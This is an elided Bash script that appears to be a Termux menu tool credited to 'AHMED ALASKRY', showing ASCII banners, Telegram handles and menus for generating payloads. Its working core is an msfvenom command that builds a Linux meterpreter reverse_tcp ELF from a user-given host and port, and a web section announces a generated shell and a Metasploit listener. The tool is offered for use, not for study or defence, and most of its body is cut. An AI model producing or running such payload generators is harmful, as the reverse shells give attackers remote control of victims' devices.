...
rasma(){
	...
	echo -e $red """
     ...
     ___   _           ___   _____   _   _    _____   __    __ 
    /   | | |         /   | /  ___/ | | / /  |  _  \  \ \  / / 
   / /| | | |        / /| | | |___  | |/ /   | |_| |   \ \/ /  
  / / | | | |       / / | | \___  \ | |\ \   |  _  /    \  /       
...
/_/   |_| |_____| /_/   |_| /_____/ |_|  \_\ |_|  \_\  /_/     ═
				...
				$yellow By :$red AHMED$green ALASKRY
...
PayLoaD(){
	...
	echo -e $white
	read -p "[ ALASKRY / PayLoaD ]~# " payload
	if [ $payload = 1 ] ; then 
		clear 
		echo -e $red
		figlet  -f big "           PaylOaD   "
		...
		echo -e $white
		read -p "[ ALASKRY / PayLoaD / ROoT ]~# " root
		if [ $root = 1 ] ; then 
			clear
			...
			clear
			echo -e $green
			figlet "		AHMED ALASKRY"
			echo -e "$red++++++++++++++++++++++++++++++++++++++" 
			sleep 0.1
			echo -e "$yellow By : $green AHMED $cyan ALASKRY"
			sleep 0.1
			echo -e "$yellow Telegram $red @a7hmed_alaskry"
			sleep 0.1
			echo -e "$red++++++++++++++++++++++++++++++++++++++" 
			sleep 3
			rasma
		...
		if [ $termux = 1 ] ; then 
			...
			sleep 2
			msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=$host LPORT=$port -o $name.elf
			mv $name.elf /sdcard/ALASKRY ;clear
...
web(){
	...
	if [ "$web" = "1" ] ; then
		...
		if [ "$web2" = "1" ];then
			...
			clear
			echo -e "$green[$cyan*$green] $green Done $white>>$yellow The SheLL in /sdcard/ALASKRY "
			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
			sleep 5
...
exit(){
	...
	echo -e "$red++++++++++++++++++++++++++++++++++++++" 
	sleep 0.2
	echo -e "$yellow By : $green ahmed $cyan HACKER"
	sleep 0.2
	echo -e "$yellow Telegram $red @a7mer_alaskry"
	sleep 0.2
	echo -e "$red++++++++++++++++++++++++++++++++++++++" 
